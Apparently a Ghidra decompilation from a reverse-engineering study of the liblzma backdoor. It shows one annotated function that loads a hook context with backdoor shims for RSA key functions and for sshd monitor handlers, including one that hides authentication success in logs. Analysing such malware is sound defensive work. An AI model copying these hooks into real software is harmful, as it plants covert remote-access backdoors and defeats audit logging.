// /home/kali/xzre-ghidra/xzregh/1027D0_hooks_ctx_init_or_wait_for_shared_globals.c
// Function: hooks_ctx_init_or_wait_for_shared_globals @ 0x1027D0
// Calling convention: __stdcall
// Prototype: int __stdcall hooks_ctx_init_or_wait_for_shared_globals(backdoor_hooks_ctx_t * ctx)


/*
 * AutoDoc: Primes a transient `backdoor_hooks_ctx_t` before stage two patches the GOT. It always points `hooks_data_slot_ptr` at the
 * `hooks_data` blob baked into liblzma, resets the bootstrap flags, and when `shared_globals_ptr` is still NULL it seeds every
 * hook entry (audit shim, RSA helpers, and the mm_* monitor handlers) before returning 0x65 so the caller retries after the shared
 * globals are published. Once the shared block exists it simply returns 0, signalling that the structure now inherits every
 * pointer from the shared globals.
 */

#include "xzre_types.h"

int hooks_ctx_init_or_wait_for_shared_globals(backdoor_hooks_ctx_t *ctx)

{
  int init_status;
  
  init_status = 5;
  if (ctx != (backdoor_hooks_ctx_t *)0x0) {
    // AutoDoc: Expose the static hook blob immediately so even transient contexts can dereference the shared state.
    ctx->hooks_data_slot_ptr = (backdoor_hooks_data_t **)&hooks_data;
    init_status = 0;
    // AutoDoc: Only burn in the literal hook entry points while we are still waiting for the shared globals to exist.
    if (ctx->shared_globals_ptr == (backdoor_shared_globals_t *)0x0) {
      ctx->bootstrap_state_flags = 4;
      ctx->symbind64_trampoline = (audit_symbind64_fn)&LAB_001028d0;
      ctx->rsa_public_decrypt_entry = rsa_public_decrypt_backdoor_shim;
      ctx->rsa_get0_key_entry = rsa_get0_key_backdoor_shim;
      ctx->mm_log_handler_entry = mm_log_handler_hide_auth_success_hook;
      ctx->mm_answer_keyallowed_entry = mm_answer_keyallowed_payload_dispatch_hook;
      ctx->mm_answer_keyverify_entry = mm_answer_keyverify_send_staged_reply_hook;
      // AutoDoc: 0x65 forces the caller to keep looping until another thread publishes the shared globals.
      init_status = 0x65;
    }
  }
  return init_status;
}

